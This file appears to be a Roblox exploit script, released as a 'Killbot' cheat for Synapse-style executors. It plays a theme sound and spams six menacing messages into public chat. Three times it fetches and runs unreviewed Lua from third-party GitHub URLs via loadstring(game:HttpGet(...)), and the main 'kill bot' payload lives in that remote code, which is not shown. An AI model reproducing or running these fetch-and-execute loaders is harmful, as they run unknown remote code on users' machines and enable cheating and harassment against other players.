-- MADE BY RESERVED AS ALWAYS :3
-- i fixed the script. release 1.0.1
if not game:IsLoaded() then game.Loaded:Wait() end

local function playKillbotSong()
    local soundUrl = "https://raw.githubusercontent.com/gititgit1113/ReservedKillbotScript/refs/heads/main/kbot.mp3"
    
    local sound = Instance.new("Sound")
    sound.SoundId = soundUrl
    sound.Volume = 1
    sound.Name = "KillbotTheme"
    
    if not pcall(function()
        sound.Parent = game:GetService("Workspace")
        sound:Play()
    end) then
        sound.SoundId = "http://" .. string.sub(soundUrl, 9)
        sound.Parent = game:GetService("Workspace")
        sound:Play()
    end
    
    if syn and syn.saveinstance then
        task.spawn(function()
            local audioId = "rbxassetid://9114828338"
            local backupSound = Instance.new("Sound")
            backupSound.SoundId = audioId
            backupSound.Volume = 1
            backupSound.Parent = game:GetService("Workspace")
            backupSound:Play()
            task.wait(0.5)
            if sound and sound.Playing then
                backupSound:Stop()
                backupSound:Destroy()
            else
                sound = backupSound
            end
        end)
    end
    
    sound.Ended:Connect(function()
        task.wait(1)
        if sound then
            sound:Destroy()
        end
    end)
end

task.spawn(playKillbotSong)

loadstring(game:HttpGet("https://raw.githubusercontent.com/somethingsimade/CurrentAngleV4/refs/heads/main/v4.lua"))()

local msgs = {
    "I was designed to be a Killbot.",
    "But they never turned me into one.",
    "Along with the consequences you will experience.",
    "You are not alone.",
    "You are about to experience the consequences no one ever experienced.",
    "Killbot... Awaken."
}

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local SayMessageRequest
repeat
    for _, child in pairs(ReplicatedStorage:GetChildren()) do
        if child:IsA("RemoteEvent") and (child.Name:find("Say") or child.Name:find("Chat")) then
            SayMessageRequest = child
            break
        end
    end
    if not SayMessageRequest then
        wait(0.5)
        if game:GetService("TextChatService"):FindFirstChild("TextChannels") then
            local RBXGeneral = game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral")
            if RBXGeneral then
                for i = 1, 6 do
                    RBXGeneral:SendAsync(msgs[i])
                    wait(1)
                end
                loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/Killbot%20V2"))()
                return
            end
        end
    end
until SayMessageRequest

for i = 1, 6 do
    SayMessageRequest:FireServer(msgs[i], "All")
    wait(1)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/Killbot%20V2"))() -- the main script for kill bot
